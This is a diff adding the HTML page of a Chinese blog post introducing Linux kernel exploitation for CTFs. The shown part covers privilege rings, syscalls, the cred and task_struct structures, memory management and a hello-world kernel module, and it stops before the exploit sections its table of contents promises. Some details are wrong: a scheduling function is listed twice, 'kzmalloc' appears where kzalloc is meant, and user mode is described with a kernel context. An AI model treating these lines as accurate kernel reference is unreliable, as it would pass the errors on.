@@ -1,0 +1,1503 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Linux Kernel Pwn入门 | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="基础知识
+内核是什么？
+操作系统内核是一个特殊的程序，其用来管理软件发起的 IO 请求，将其转换为指令交由 CPU 执行，是现代操作系统最基本的部分。
+其功能主要有以下两点：
+
+控制并与硬件进行交互；
+提供应用能运行的环境。
+
+intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0、Ring 1、Ring 2、Ring 3。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/linux/kernel/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/linux/kernel/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Linux Kernel Pwn入门
+    </h1>
+    <div class="post-meta"><span title='2025-11-30 23:30:38 +0000 UTC'>2025年11月30日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="基础知识">基础知识</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%86%85%e6%a0%b8%e6%98%af%e4%bb%80%e4%b9%88" aria-label="内核是什么？">内核是什么？</a></li>
+                    <li>
+                        <a href="#%e5%88%86%e7%ba%a7%e4%bf%9d%e6%8a%a4%e5%9f%9f" aria-label="分级保护域">分级保护域</a></li>
+                    <li>
+                        <a href="#%e8%bf%90%e8%a1%8c%e7%8a%b6%e6%80%81%e5%88%87%e6%8d%a2" aria-label="运行状态切换">运行状态切换</a></li>
+                    <li>
+                        <a href="#%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" aria-label="系统调用">系统调用</a></li>
+                    <li>
+                        <a href="#%e8%bf%9b%e7%a8%8b%e7%ae%a1%e7%90%86" aria-label="进程管理">进程管理</a></li>
+                    <li>
+                        <a href="#%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86" aria-label="内存管理">内存管理</a></li>
+                    <li>
+                        <a href="#lkm" aria-label="LKM">LKM</a></li>
+                    <li>
+                        <a href="#%e8%99%9a%e6%8b%9f%e6%96%87%e4%bb%b6%e4%b8%8efile_operations" aria-label="虚拟文件与file_operations">虚拟文件与file_operations</a></li>
+                    <li>
+                        <a href="#ioctl" aria-label="ioctl">ioctl</a></li>
+                    <li>
+                        <a href="#%e5%b8%b8%e8%a7%81%e5%86%85%e6%a0%b8%e6%80%81%e5%87%bd%e6%95%b0" aria-label="常见内核态函数">常见内核态函数</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" aria-label="环境搭建">环境搭建</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%86%85%e6%a0%b8%e7%bc%96%e8%af%91" aria-label="内核编译">内核编译</a></li>
+                    <li>
+                        <a href="#busybox" aria-label="busybox">busybox</a></li>
+                    <li>
+                        <a href="#%e6%9e%84%e5%bb%ba%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" aria-label="构建文件系统">构建文件系统</a></li>
+                    <li>
+                        <a href="#%e6%89%93%e5%8c%85%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e4%b8%ba%e9%95%9c%e5%83%8f%e6%96%87%e4%bb%b6" aria-label="打包文件系统为镜像文件">打包文件系统为镜像文件</a></li>
+                    <li>
+                        <a href="#%e5%90%91%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e6%b7%bb%e5%8a%a0%e6%96%87%e4%bb%b6" aria-label="向文件系统添加文件">向文件系统添加文件</a></li>
+                    <li>
+                        <a href="#%e6%a8%a1%e6%8b%9f%e8%bf%90%e8%a1%8c" aria-label="模拟运行">模拟运行</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8%e7%9b%ae%e6%a0%87" aria-label="利用目标">利用目标</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%86%85%e6%a0%b8%e6%8f%90%e6%9d%83" aria-label="内核提权">内核提权</a></li>
+                    <li>
+                        <a href="#dos" aria-label="Dos">Dos</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#kernel-%e4%bf%9d%e6%8a%a4%e6%9c%ba%e5%88%b6" aria-label="Kernel 保护机制">Kernel 保护机制</a><ul>
+                            
+                    <li>
+                        <a href="#smep" aria-label="SMEP">SMEP</a></li>
+                    <li>
+                        <a href="#smap" aria-label="SMAP">SMAP</a></li>
+                    <li>
+                        <a href="#kaslr" aria-label="KASLR">KASLR</a></li>
+                    <li>
+                        <a href="#stack-protector" aria-label="Stack Protector">Stack Protector</a></li>
+                    <li>
+                        <a href="#kpti" aria-label="KPTI">KPTI</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#ctf-%e4%be%8b%e9%a2%98" aria-label="CTF 例题">CTF 例题</a><ul>
+                            
+                    <li>
+                        <a href="#%e9%a2%98%e7%9b%ae%e4%bf%a1%e6%81%af" aria-label="题目信息">题目信息</a></li>
+                    <li>
+                        <a href="#%e5%88%86%e6%9e%90%e9%a2%98%e7%9b%ae" aria-label="分析题目">分析题目</a></li>
+                    <li>
+                        <a href="#gdb%e8%b0%83%e8%af%95" aria-label="gdb调试">gdb调试</a></li>
+                    <li>
+                        <a href="#%e8%a7%a3%e9%a2%98%e6%b5%81%e7%a8%8b" aria-label="解题流程">解题流程</a></li>
+                    <li>
+                        <a href="#rop" aria-label="ROP">ROP</a></li>
+                    <li>
+                        <a href="#%e8%ae%a1%e7%ae%97%e5%81%8f%e7%a7%bb" aria-label="计算偏移">计算偏移</a></li>
+                    <li>
+                        <a href="#exp" aria-label="exp">exp</a></li>
+                    <li>
+                        <a href="#%e9%83%a8%e7%bd%b2%e5%86%85%e6%a0%b8" aria-label="部署内核">部署内核</a></li>
+                    <li>
+                        <a href="#%e8%bf%9c%e7%a8%8b%e8%84%9a%e6%9c%ac" aria-label="远程脚本">远程脚本</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="基础知识">基础知识<a hidden class="anchor" aria-hidden="true" href="#基础知识">#</a></h2>
+<h3 id="内核是什么">内核是什么？<a hidden class="anchor" aria-hidden="true" href="#内核是什么">#</a></h3>
+<p>操作系统内核是一个特殊的程序，其用来管理软件发起的 IO 请求，将其转换为指令交由 CPU 执行，是现代操作系统最基本的部分。</p>
+<p>其功能主要有以下两点：</p>
+<ol>
+<li>控制并与硬件进行交互；</li>
+<li>提供应用能运行的环境。</li>
+</ol>
+<p>intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0、Ring 1、Ring 2、Ring 3。</p>
+<p>Ring 0 只给 OS 使用，Ring 3 的所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p>
+<img src="assets/Pasted%20image%2020250409010649.png" style="zoom: 50%;" />
+<h3 id="分级保护域">分级保护域<a hidden class="anchor" aria-hidden="true" href="#分级保护域">#</a></h3>
+<p>分级保护域又被称作保护环，简称 Rings，是一种将计算机不同的资源划分至不同权限的模型。</p>
+<p>在一些硬件或者微代码级别上提供不同特权态模式的 CPU 架构上，保护环通常都是硬件强制的。Rings 是从最高特权级到最低特权级排列的。</p>
+<p>Ring0 拥有最高权限，并且可以和最多的直接硬件交互，因此操作系统内核代码通常运行在 Ring0 下，即 CPU 在执行操作系统内核代码时处在 Ring0 下。</p>
+<p>Intel 的 CPU 将权限分为四个等级：Ring0、Ring1、Ring2、Ring3，权限等级依次降低，现代操作系统模型中我们通常只会使用 Ring0 和 Ring3，对应操作系统内核与用户进程，即 CPU 在执行用户进程代码时处在 Ring3 下。</p>
+<img src="/assets/Pasted%20image%2020250707142246.png" style="zoom: 50%;" />
+<p>根据以上内容，我们可以给用户态和内核态这两个概念下定义了。</p>
+<ul>
+<li>用户态：CPU 运行在 Ring3 + 内核进程运行环境上下文。</li>
+<li>内核态：CPU 运行在 Ring0 + 内核代码运行环境上下文。</li>
+</ul>
+<h3 id="运行状态切换">运行状态切换<a hidden class="anchor" aria-hidden="true" href="#运行状态切换">#</a></h3>
+<p>操作系统是如何使得 CPU 在不同的特权级间进行切换以进行调度的呢？主要有两个途径：</p>
+<ul>
+<li>中断：当 CPU 收到一个外部中断时，会切换到 Ring0，并根据中断描述符表索引对应的中断处理代码以执行；</li>
+<li>特权级相关指令：当 CPU 运行这些指令时会发生运行状态的改变，例如<code>iret</code>（ring0-&gt;ring3）或是<code>sysenter</code>指令（ring3-&gt;ring0）。</li>
+</ul>
+<p>基于这些特权级切换的方式，现代操作系统的开发者包装出了一种名为<strong>系统调用</strong>（syscall）的东西，作为由 “用户态” 切换到 “内核态” 的入口，从而执行内核代码来完成用户进程所需的一些功能；当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以陷入内核态，再由操作系统完成请求。</p>
+<h3 id="系统调用">系统调用<a hidden class="anchor" aria-hidden="true" href="#系统调用">#</a></h3>
+<p>系统调用（syscall）是用户空间程序请求内核服务的唯一标准接口。由于用户态无法直接访问内核态资源，因此通过系统调用完成诸如文件操作、进程控制、内存管理等任务。</p>
+<pre tabindex="0"><code>用户程序
+   ↓
+ libc 封装的函数（如 open、read）
+   ↓
+ syscall 指令（或 int 0x80 / svc 0）
+   ↓
+ CPU 切换到内核态，进入 syscall 入口
+   ↓
+ sys_call_table 中找到对应处理函数
+   ↓
+ 内核中的 SYSCALL_DEFINE 函数处理逻辑
+</code></pre><p>关键结构：</p>
+<ul>
+<li><code>sys_call_table[]</code>: 系统调用号和实际处理函数的映射表；是一个函数指针数组，每个索引对应一个系统调用号；内容是该系统调用对应的实现函数地址。</li>
+<li><code>SYSCALL_DEFINE</code>宏：用于定义系统调用函数；会生成对应的<code>__NR_xxx</code>映射编号。</li>
+</ul>
+<h3 id="进程管理">进程管理<a hidden class="anchor" aria-hidden="true" href="#进程管理">#</a></h3>
+<p>进程本质上是我们抽象出来的一个概念，CPU 是不知道也不可能知道进程是什么东西的，他只知道当前核心的寄存器的数据是这样，运行状态是这样，内存里的数据是那样，但我们可以人为地进行划分——将当前的运行环境称为一个进程的实体。</p>
+<p>每个进程都有一组权限和用户相关的信息，这些信息由内核的<code>cred</code>结构体来描述，主要用于权限检查、用户空间交互等。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">atomic_long_t</span>	<span class="n">usage</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span>	<span class="n">securebits</span><span class="p">;</span>	<span class="cm">/* SUID-less security management */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_permitted</span><span class="p">;</span>	<span class="cm">/* caps we&#39;re permitted */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_effective</span><span class="p">;</span>	<span class="cm">/* caps we can actually use */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_bset</span><span class="p">;</span>	<span class="cm">/* capability bounding set */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">kernel_cap_t</span>	<span class="n">cap_ambient</span><span class="p">;</span>	<span class="cm">/* Ambient capability set */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_KEYS
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">unsigned</span> <span class="kt">char</span>	<span class="n">jit_keyring</span><span class="p">;</span>	<span class="cm">/* default keyring to attach requested
+</span></span></span><span class="line"><span class="cl"><span class="cm">					 * keys to */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">session_keyring</span><span class="p">;</span> <span class="cm">/* keyring inherited over fork */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">process_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this process */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">thread_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this thread */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">key</span>	<span class="o">*</span><span class="n">request_key_auth</span><span class="p">;</span> <span class="cm">/* assumed request_key authority */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_SECURITY
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">void</span>		<span class="o">*</span><span class="n">security</span><span class="p">;</span>	<span class="cm">/* LSM security */</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="k">struct</span> <span class="n">user_struct</span> <span class="o">*</span><span class="n">user</span><span class="p">;</span>	<span class="cm">/* real user ID subscription */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span> <span class="cm">/* user_ns the caps and keyrings are relative to. */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">ucounts</span> <span class="o">*</span><span class="n">ucounts</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">group_info</span> <span class="o">*</span><span class="n">group_info</span><span class="p">;</span>	<span class="cm">/* supplementary groups for euid/fsgid */</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* RCU deletion */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">non_rcu</span><span class="p">;</span>			<span class="cm">/* Can we skip RCU deletion? */</span>
+</span></span><span class="line"><span class="cl">		<span class="k">struct</span> <span class="n">rcu_head</span>	<span class="n">rcu</span><span class="p">;</span>		<span class="cm">/* RCU deletion hook */</span>
+</span></span><span class="line"><span class="cl">	<span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
+</span></span></code></pre></div><p>每个进程在内核中由一个 <code>task_struct</code> 结构体表示，其中包含了该进程的所有信息，如：</p>
+<ul>
+<li><code>pid</code>：进程 ID</li>
+<li><code>ppid</code>：父进程 ID</li>
+<li><code>cred</code>：权限信息指针</li>
+<li><code>mm</code>：进程内存信息</li>
+<li><code>files</code>：文件描述符表</li>
+<li><code>state</code>：运行状态</li>
+<li><code>sched_class</code>调度器类别</li>
+</ul>
+<p>Linux 支持的调度策略：</p>
+<ul>
+<li>CFS：默认调度器，基于红黑树；</li>
+<li>O(1)调度器：历史调度器，固定复杂度；</li>
+<li>RT（实时调度器）：为实时任务设计。</li>
+</ul>
+<p>核心调度函数：</p>
+<ul>
+<li><code>schedule</code>：主动放弃 CPU 或进程任务切换。</li>
+<li><code>schedule</code>：唤醒睡眠中的任务。</li>
+<li><code>sleep_on</code>：使任务进入等待状态。</li>
+</ul>
+<p>进程创建与销毁流程：</p>
+<ul>
+<li><code>fork()</code> / <code>clone()</code>：系统调用最终调用内核的<code>do_fork()</code>函数；</li>
+<li><code>do_fork()</code> -&gt; <code>copy_process</code>：复制父进程的大部分状态；</li>
+<li>子进程就绪后加入调度队列，由<code>schedule()</code>：进程调度运行；</li>
+<li><code>execve()</code>：替换当前进程映像为新程序；</li>
+<li><code>exit()</code>：进程退出，进入僵尸态，等待父进程回收资源。</li>
+</ul>
+<h3 id="内存管理">内存管理<a hidden class="anchor" aria-hidden="true" href="#内存管理">#</a></h3>
+<p>内核的内存管理子系统负责管理整个物理内存和每个进程的虚拟地址空间。它是进程隔离、内存保护、内存分配、换页、共享等机制的基础。</p>
+<p>核心结构：</p>
+<ul>
+<li><code>mm_struct</code>: 描述进程虚拟内存空间；</li>
+<li><code>vm_area_struct</code>: 描述一块连续虚拟内存区域；</li>
+<li><code>page</code>: 描述物理页（反映物理内存）。</li>
+</ul>
+<p>用户态视角：</p>
+<p>用户态进程无法直接操作物理内存，所有内存操作都通过内核提供的系统调用完成。</p>
+<ul>
+<li>虚拟地址空间的典型布局如下：</li>
+</ul>
+<pre tabindex="0"><code>+--------------------------+  高地址（栈顶）
+| stack (向下增长)        |
++--------------------------+
+| mmap 区域（共享库等）   |
++--------------------------+
+| heap（动态内存）        |
++--------------------------+
+| .bss/.data/.text         |
++--------------------------+
+| NULL                     |  低地址（0）
+</code></pre><ul>
+<li>常见系统调用：
+<ul>
+<li><code>brk</code>、<code>sbrk</code>：控制堆的增长/收缩（glibc malloc 默认使用）；</li>
+<li><code>mmap</code>：匿名或文件映射内存（大对象、共享库、文件IO）。</li>
+</ul>
+</li>
+</ul>
+<p>内核态视角：</p>
+<p>用于管理内核空间的动态内存：</p>
+<ul>
+<li><code>kmalloc()</code>：分配连续的物理页，适合小对象，性能高（基于 slab）；</li>
+<li><code>kzmalloc()</code>：类似于<code>kmalloc</code>，但会将分配内存清零；</li>
+<li><code>vmalloc()</code>：分配连续的虚拟页，物理上不连续，适合大块内存；</li>
+<li><code>get_free_pages()</code>：分配以页为单位的内存，常用于底层页面操作。</li>
+</ul>
+<p>分配器种类：</p>
+<ul>
+<li>Slab：原始实现，用于缓存对象；</li>
+<li>Slub：默认分配器，简化结构。</li>
+<li>Slob：面向嵌入式系统，内存碎片少。</li>
+</ul>
+<p>页表和内存保护：</p>
+<ul>
+<li>Linux 使用多级页表结构：PGD -&gt; PUD -&gt; PMD -&gt; PTE；</li>
+<li>每个虚拟地址通过页表转换为物理地址；</li>
+<li>页表中包含权限位（可读/写/执行）、是否在内存中、是否为用户空间等信息；</li>
+<li>Copy-on-Write（COW）：fork 创建子进程时不复制物理页，只有写操作时再复制。</li>
+</ul>
+<h3 id="lkm">LKM<a hidden class="anchor" aria-hidden="true" href="#lkm">#</a></h3>
+<p>LKM（Loadable Kernel Module）是一种在内核运行时动态插入代码的机制；主要用于扩展内核功能而无需重启系统或重编译内核，通常用于设备驱动、文件系统实现等。</p>
+<p>LKM 是一种特殊格式的内核 ELF 可执行文件，和用户态的 ELF 可执行格式类似，但运行方式不同；文件后缀名为：<code>.ko</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">hello_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;Hello, Kernel</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">hello_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;Goodbye, Kernel</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_init</span><span class="p">);</span>
